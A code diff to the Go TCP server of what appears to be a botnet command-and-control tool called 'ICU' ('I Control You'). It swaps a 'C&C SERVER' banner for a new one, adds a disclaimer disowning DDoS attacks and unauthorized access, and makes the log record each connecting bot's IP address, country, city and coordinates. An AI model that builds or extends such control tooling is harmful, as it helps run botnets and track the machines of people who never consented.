@@ -38,13 +38,15 @@ func (this *TCPServer) StartServer() error {
 	}
 	defer listener.Close()
 
-	fmt.Println("\n" + ` ██████╗   ██╗    ██████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
-██╔════╝   ██║   ██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
-██║     ████████╗██║         ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
-██║     ██╔═██╔═╝██║         ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
-╚██████╗██████║  ╚██████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
- ╚═════╝╚═════╝   ╚═════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
-                                                                              `)
+	fmt.Print("\033[31m\n" + `  _____ _____ _    _
+ |_   _/ ____| |  | | {0.5.0#dev}
+   | || |    | |  | |
+   | || |    | |  | |
+  _| || |____| |__| | I Control You :) :(
+ |_____\_____|\____/
+` + "\n\033[0m")
+
+	fmt.Println("\033[33m[!] ICU is not responsible for DDoS attacks or unauthorized access. \nThe responsibility for such actions lies with the violators.\n\033[0m")
 
 	this.logger.Info(fmt.Sprintf("Server started %s:%d", this.host, this.port))
 
@@ -94,7 +96,8 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 		}
 
 		this.cache.SetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo", ipgeoStruct, 10*time.Minute)
-		this.logger.Info(fmt.Sprintf("CONNECTED: %s:%d", this.cache.GetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo").(types.IPGeo).IP, conn.RemoteAddr().(*net.TCPAddr).Port))
+		cache := this.cache.GetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo").(types.IPGeo)
+		this.logger.Info(fmt.Sprintf("CONNECTED PC[%s %s, %s (%f, %f)]", cache.IP, cache.CountryName, cache.City, cache.Latitude, cache.Longitude))
 	})
 
 	emitter.On("error", func(error interface{}) {
